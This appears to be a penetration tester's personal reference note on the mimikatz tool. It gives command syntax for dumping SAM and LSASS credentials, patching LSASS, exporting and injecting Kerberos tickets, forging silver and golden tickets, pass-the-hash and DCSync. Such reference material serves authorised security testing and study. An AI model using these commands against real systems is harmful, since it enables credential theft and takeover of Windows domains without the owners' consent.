---
tags:
  - "#type/tool"
  - "#attack/credential-access"
Link: https://github.com/gentilkiwi/mimikatz/wiki
Purpose: gather credentials on windows
---
# Info

Extracts password, hashes, etc. from various sources on windows:

- SAM
- Memory of the LSASS

For fundamentals see [[2 Tech-Specifics/OS/Windows/Credential Access - Windows/Local Credential Access - Windows|Windows Local Credential Access]]

Good reference guide: [adsecurity](https://adsecurity.org/?page_id=1821)

**Required privileges:**

- Administrator
- SeDebugPrivilege: allows to debug (i.e. manipulate) processes of other users

Alternatively, use the [Token Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token#elevate) of mimikatz to elevate privileges.

# Usage

1. start mimikatz with `mimikatz.exe`
2. Use commands

**Hint:** Commands can also be supplied as arguments to the mimikatz command prompt - e.g: `.\mimikatz.exe "log" "privilege::debug" "token::elevate"  "lsadump::sam" "sekurlsa::logonpasswords" "sekurlsa::tickets" "exit"`

Commands within the mimikatz shell have the following format:

`<modulename>::<commandname> [arguments]`

e.g. `crypto::certificates /systemstore:local_machine`

Available modules: <https://github.com/gentilkiwi/mimikatz/wiki#modules>

> [!Hint] Filter output using [[3 Tools/utilities/grep|grep]] & `uniq` to get an overview of the collected data
> Contents `grep -i "username" mimikatz2.log | uniq`

## Common commands:

| Command                            | Purpose                                                                              |
| ---------------------------------- | ------------------------------------------------------------------------------------ |
| `log <path>`                       | write output to file                                                                 |
| `privilege::debug`                 | enable debugging privileges                                                          |
| `token::elevate`                   | elevate privileges                                                                   |
| `misc::cmd`                        | launch new cmd instance with current context                                         |
| `crypto::capi`<br>or `crypto::cng` | make non-exportable private keys from certificates exportable                        |

## Extract password hashes

| Command                    | Purpose                                                                                                                    |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| `lsadump::sam`             | dump credentials of local accounts from [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SAM\|SAM]]                    |
| `sekurlsa::logonpasswords` | extract cached domain passwords from [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#LSASS\|LSASS Memory]]            |
| `lsadump::lsa /patch`      | patch the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#LSASS\|LSASS Process]] to extract more critical credentials |

## Work with Kerberos Tickets

| Command                    | Purpose                                                                                                                                       |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `sekurlsa::tickets`        | dump cached [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#Kerberos\|Kerberos Tickets]]<br>use `/export` to export the tickets to files |
| `kerberos::golden`         | see [[#Forging Kerberos Tickets]]                                                                                                             |
| `kerberos::ptt <tgs_file>` | inject a Kerberos TGS into the present cache                                                                                                  |
| `kerberos::purge`          | delete all cached kerberos tickets                                                                                                            |

# Snippets

## Forging Kerberos Tickets

> [!Hint] Privileges of forged tickets
> When forging tickets, mimikatz sets the group memberships to high privileged groups (domain admins, local admins) per default. - The group [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|RIDs]] are shown in the output.

### Silver Tickets

See [[2 Tech-Specifics/Network/Protocols/Kerberos#Silver Tickets|Kerberos - Forging Silver Tickets]]

**Required information:**

- NTLM password hash of the target service account
	- see [[2 Tech-Specifics/OS/Windows/Credential Access - Windows/Overview - Credential Access - Windows|Windows  Credential Access]]
- Domain SID
	- use `whoami /user` and only use the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|Domain SID]]
- SPN of the target service
	- e.g. use ``Get-DomainUser -SPN | select serviceprincipalname``

**Workflow:**

1. Create a silver ticket with `kerberos::golden`:

```
kerberos::golden /sid:<domain_SID> /domain:<domain_name> /ptt /target:<SPN> /service:<protocol> /rc4:<ntlm_hash> /user:<username>
```

- `/ptt` tells mimikatz to inject created ticket to the local cache
- `/service:<protocol>` - e.g. `http`, `smb`
- `/user` can be set to any existing domain user

2. use `klist` to verify that the ticket is present

### Golden Tickets

See [[2 Tech-Specifics/Network/Protocols/Kerberos#Golden Tickets|Kerberos - Forging Golden Tickets]]

**Required information:**

- NTLM password hash of the `krbtgt` account
- Domain SID
	- use `whoami /user` and only use the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|Domain SID]]

**Workflow:**

1. Create a golden ticket with `kerberos::golden`:

```
kerberos::golden /user:<user> /domain:<domain_name> /sid:<domain_sid> /krbtgt:<ntlm_hash> /ptt
```

- `/ptt` tells mimikatz to inject created ticket to the local cache
- `/user` can be set to any existing domain user
2. use `klist` to verify that the ticket is present

## Spawn Process with cached Credentials

**Purpose:**

- [[2 Tech-Specifics/Active Directory/Credential Access - AD/Overpass the Hash|Overpass the Hash]]
- [[2 Tech-Specifics/OS/Windows/Privilege Escalation - Windows/Overview - Privilege Escalation - Windows|Windows Privilege Escalation]]?

```
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:<command>
```

E.g. run `powershell` as command. Note: When running `whoami` from the new powershell process, it will still show the "old" user you started the escalation from.

## DCSync Attack

See: [[2 Tech-Specifics/Active Directory/Lateral Movement - AD/dcsync|dcsync]]

Extract credentials of a target user:

`lsadump::dcsync /user:<domain>\<target_user>`
